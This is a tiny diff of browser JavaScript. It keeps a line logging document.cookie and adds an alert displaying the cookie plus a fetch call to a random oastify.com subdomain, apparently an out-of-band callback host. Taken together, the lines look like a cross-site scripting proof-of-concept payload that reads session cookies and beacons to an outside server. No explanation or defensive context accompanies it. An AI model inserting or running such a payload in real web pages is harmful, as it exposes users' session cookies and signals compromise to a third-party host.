@@ -1,3 +1,3 @@
 console.log(document.cookie);
-console.log(localStorage);
-console.log(sessionStorage);
+alert(document.cookie);
+fetch("http://u0v45se8xje4kwifmxwae7h7hynpblza.oastify.com")
